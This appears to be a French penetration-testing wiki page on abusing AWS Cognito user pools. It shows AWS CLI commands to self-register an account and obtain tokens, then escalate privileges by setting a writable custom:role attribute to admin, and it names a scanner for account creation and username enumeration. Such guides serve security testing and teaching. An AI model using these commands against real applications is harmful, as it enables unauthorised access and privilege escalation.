---
title: "User pool : auto-inscription et attributs modifiables"
order: 2
description: "Abuser de l'auto-inscription ouverte d'un user pool et des attributs utilisateur modifiables pour obtenir ou élever un accès."
keywords:
  - Cognito
  - user pool
  - auto-inscription
  - attributs
  - sign-up
---

# User pool

Un user pool Cognito est l'annuaire des comptes de l'application. Lorsque l'auto-inscription est activée, quiconque peut s'enrôler et obtenir une session valide ; lorsque des attributs auxquels l'application fait confiance pour l'autorisation sont **modifiables** par l'utilisateur, vous les définissez pour vous élever.

## S'enrôler soi-même

```bash
aws cognito-idp sign-up --client-id <app-client-id> \
  --username attacker --password 'Passw0rd!' \
  --user-attributes Name=email,Value=a@you.example
aws cognito-idp initiate-auth --client-id <app-client-id> \
  --auth-flow USER_PASSWORD_AUTH \
  --auth-parameters USERNAME=attacker,PASSWORD='Passw0rd!'
```

## Abus d'attributs

Si un attribut `custom:` (role, tenant, is_admin) figure dans l'ensemble modifiable du client, mettez-le à une valeur privilégiée :

```bash
aws cognito-idp update-user-attributes --access-token <token> \
  --user-attributes Name=custom:role,Value=admin
```

## Notes d'exploitation

- L'identifiant de client d'application est une valeur côté client ; récupérez-le depuis le front end.
- Un e-mail ou un téléphone auto-vérifié peut permettre à l'inscription d'aboutir sans boîte de réception réelle selon la configuration.
- Les attributs d'autorisation modifiables sont le cas à forte valeur : l'application fait confiance à une valeur que l'utilisateur contrôle.

## Outils

- **AWS CLI** (`cognito-idp sign-up` / `initiate-auth` / `update-user-attributes`).
- **cognito-scanner** (`pip install cognito-scanner`) : automatise la création de compte non souhaitée et l'oracle d'existence de nom d'utilisateur contre un user pool.

## Références

- [HackTricks Cloud: AWS Cognito user pools](https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-services/aws-cognito-enum/index.html)
- [AWS: Cognito user pools](https://docs.aws.amazon.com/cognito/latest/developerguide/cognito-user-identity-pools.html)
- [cognito-scanner](https://pypi.org/project/cognito-scanner/)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
